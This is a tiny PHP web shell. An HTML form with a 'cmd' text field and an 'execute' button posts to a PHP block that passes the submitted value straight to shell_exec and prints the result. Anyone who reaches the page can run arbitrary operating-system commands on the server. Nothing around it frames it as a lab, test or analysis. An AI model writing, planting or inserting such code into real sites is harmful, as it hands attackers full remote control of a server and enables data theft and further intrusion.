<html>
<form name="f1" action="" method="post">
<input type="text" name="cmd" id="cmd">
<input type="submit" value="execute">
</html>

<?php
$command=$_POST['cmd'];
$data=shell_exec($command);
print_r($data);

?>